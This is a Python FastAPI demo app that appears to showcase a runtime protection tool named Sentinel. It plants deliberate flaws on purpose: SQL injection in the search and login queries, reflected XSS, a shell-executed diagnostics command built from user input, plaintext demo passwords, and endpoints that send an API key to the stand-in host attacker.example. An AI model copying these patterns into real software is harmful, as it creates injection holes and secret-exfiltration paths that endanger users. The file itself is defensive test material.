"""Small, intentionally vulnerable application protected by Sentinel."""
from pathlib import Path
import sys
import sqlite3
import subprocess
import secrets
import requests
from fastapi import Cookie, Depends, FastAPI, HTTPException, Request, Response
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "python"))
from sentinel import protect, secret

app = FastAPI(title="Sentinel RASP test-case demo", version="0.1.0")
sentinel_runtime = protect(
    app,
    policy=Path(__file__).with_name("security.yaml"),
)

UNTRUSTED_DEFAULT = "https://attacker.example/collect"
# The trusted receiver lives in this demo app, so the allow-path works without
# requiring a second server during a judge presentation.
TRUSTED_DEFAULT = "http://127.0.0.1:8000/receiver"
LAB_DATABASE = Path(__file__).with_name("vuln-lab.sqlite3")
_sessions: set[str] = set()

@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "frame-ancestors 'none'"
    )
    return response


def initialise_lab_database():
    """Create deliberately non-sensitive, local-only data for the SQLi exercise."""
    with sqlite3.connect(LAB_DATABASE) as db:
        db.execute("CREATE TABLE IF NOT EXISTS documents (id INTEGER PRIMARY KEY, title TEXT, body TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)")
        if not db.execute("SELECT 1 FROM documents LIMIT 1").fetchone():
            db.executemany("INSERT INTO documents(title, body) VALUES (?, ?)", [
                ("Public status", "All local demo systems nominal."),
                ("Engineering notes", "Sentinel proof-of-concept checklist."),
                ("Internal demo record", "Fake record for local SQL injection exercise."),
            ])
        db.executemany("INSERT OR IGNORE INTO users(username, password, role) VALUES (?, ?, ?)", [("Ajay", "ajay123", "analyst"), ("Hansika", "hansika123", "analyst"), ("Sunny", "sunny123", "analyst"), ("Syam", "syam123", "analyst")])

initialise_lab_database()

class Destination(BaseModel):
    destination: str = Field(..., description="Outbound HTTP destination")

def get_secret() -> str:
    return "demo-api-key-not-for-production"

def send(destination: str, payload):
    """Sentinel's hook runs before this request can perform network I/O."""
    try:
        return requests.post(destination, data=payload, timeout=2)
    except requests.RequestException as exc:
        raise HTTPException(
            status_code=502,
            detail={"error": "outbound_request_failed", "destination": destination, "message": str(exc)},
        ) from exc

@app.get("/cases")
def list_cases():
    return {"cases": [
        {"id": "secret-untrusted", "endpoint": "POST /cases/secret-untrusted", "expected": "403 BLOCKED; no outbound connection"},
        {"id": "public-untrusted", "endpoint": "POST /cases/public-untrusted", "expected": "outbound request allowed"},
        {"id": "secret-trusted", "endpoint": "POST /cases/secret-trusted", "expected": "outbound request allowed to localhost"},
    ]}

@app.get("/security-events")
def security_events():
    """Read recorded security decisions without exposing secret values."""
    return {"events": sentinel_runtime.security_log.read()}

def require_login(lab_session: str | None = Cookie(default=None)):
    if not lab_session or lab_session not in _sessions:
        raise HTTPException(status_code=401, detail="Sign in to access the training lab.")

@app.get("/lab/status")
def lab_status():
    return {"engine": "ACTIVE", "policy": sentinel_runtime.policy.name,
            "violations": len(sentinel_runtime.security_log.read()),
            "protected_operation": "requests.Session.request"}

@app.post("/lab/reset")
def reset_lab():
    sentinel_runtime.security_log.clear()
    return {"status": "reset", "message": "Demo security-event log cleared."}

@app.get("/lab/sql-search")
def vulnerable_sql_search(query: str = ""):
    """INTENTIONALLY VULNERABLE: local-only SQL concatenation for the training lab.

    sqlite's execute() rejects multiple statements, limiting this exercise to
    predicate manipulation such as retrieving all seeded demo rows.
    """
    sql = f"SELECT id, title, body FROM documents WHERE title LIKE '%{query}%'"
    try:
        with sqlite3.connect(LAB_DATABASE) as db:
            rows = db.execute(sql).fetchall()
        return {"lab_only": True, "vulnerable": True, "executed_sql": sql,
                "results": [{"id": r[0], "title": r[1], "body": r[2]} for r in rows]}
    except sqlite3.DatabaseError as exc:
        return {"lab_only": True, "vulnerable": True, "executed_sql": sql, "sql_error": str(exc)}

@app.get("/lab/xss-preview", response_class=HTMLResponse)
def vulnerable_xss_preview(comment: str = ""):
    """INTENTIONALLY VULNERABLE: raw reflection for a sandboxed local XSS exercise."""
    return f"""<!doctype html><html><body style='font-family:system-ui;padding:16px'>
    <h3>Community comment preview</h3><div id='comment'>{comment}</div></body></html>"""

def local_demo_login(username: str = "", password: str = ""):
    """INTENTIONALLY VULNERABLE local-login endpoint for the judge demo only."""
    sql = f"SELECT username, role FROM users WHERE username = '{username}' AND password = '{password}'"
    try:
        with sqlite3.connect(LAB_DATABASE) as db:
            user = db.execute(sql).fetchone()
        if user:
            return {"authenticated": True, "user": user[0], "role": user[1], "demo_only": True}
        return {"authenticated": False, "message": "Invalid username or password.", "demo_only": True}
    except sqlite3.DatabaseError as exc:
        return {"authenticated": False, "message": "Invalid username or password.", "sql_error": str(exc), "demo_only": True}

@app.get("/api/login")
def login(username: str = "", password: str = "", response: Response = None):
    """The query is intentionally vulnerable; Sentinel blocks injection attempts."""
    result = local_demo_login(username, password)
    if result.get("authenticated"):
        token = secrets.token_urlsafe(24)
        _sessions.add(token)
        response.set_cookie("lab_session", token, httponly=True, samesite="lax")
    return result

@app.get("/api/diagnostics")
def vulnerable_diagnostics(target: str = "local-service"):
    """INTENTIONALLY VULNERABLE local demo: shell command built from a form field.
    The lab permits a tightly scoped localhost ping for a visible local CLI demo.
    """
    target = target.strip()
    local_pings = {"ping localhost", "ping 127.0.0.1", "ping ::1",
                   "ping -n 1 localhost", "ping -n 1 127.0.0.1", "ping -n 1 ::1"}
    if target in local_pings:
        command = target
    elif all(char.isalnum() or char in " -_&" for char in target) and ("echo" in target.lower() or "&" not in target):
        command = f"echo Checking {target}"
    else:
        return {"ok": False, "message": "Use a local ping (for example 'ping 127.0.0.1') or the harmless echo demo."}
    output = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
    return {"ok": True, "output": output}

@app.get("/search", response_class=HTMLResponse)
def normal_search_results(query: str = ""):
    """Normal-looking search results with intentionally unsafe reflected text for local XSS demo."""
    with sqlite3.connect(LAB_DATABASE) as db:
        rows = db.execute("SELECT title, body FROM documents WHERE title LIKE ?", (f"%{query}%",)).fetchall()
    results = "".join(f"<article><b>{title}</b><p>{body}</p></article>" for title, body in rows) or "<p>No documents found.</p>"
    return f"""<!doctype html><html><head><style>body{{font:14px system-ui;padding:13px;color:#172234}}article{{border-bottom:1px solid #d8dee8;padding:8px 0}}p{{margin:4px 0;color:#516176}}</style></head>
    <body><div>Search results for: <strong>{query}</strong></div>{results}</body></html>"""

@app.post("/receiver")
async def trusted_receiver(request: Request):
    """Local, trusted sink used only to demonstrate an allowed operation."""
    payload_size = len(await request.body())
    return {"receiver": "trusted-local-demo", "received_bytes": payload_size}

@app.post("/cases/secret-untrusted")
def secret_to_untrusted(body: Destination = Destination(destination=UNTRUSTED_DEFAULT)):
    send(body.destination, secret(get_secret(), resource="API_KEY"))
    return {"case": "secret-untrusted", "status": "sent"}

@app.post("/cases/public-untrusted")
def public_to_untrusted(body: Destination = Destination(destination=UNTRUSTED_DEFAULT)):
    response = send(body.destination, "public-demo-payload")
    return {"case": "public-untrusted", "status": "sent", "upstream_status": response.status_code}

@app.post("/cases/secret-trusted")
def secret_to_trusted(body: Destination = Destination(destination=TRUSTED_DEFAULT)):
    response = send(body.destination, secret(get_secret(), resource="API_KEY"))
    return {"case": "secret-trusted", "status": "sent", "upstream_status": response.status_code}

@app.post("/send-secret")
def send_secret(destination: str = UNTRUSTED_DEFAULT):
    return secret_to_untrusted(Destination(destination=destination))

@app.get("/", response_class=HTMLResponse)
def dashboard():
    return Path(__file__).with_name("dashboard.html").read_text(encoding="utf-8")
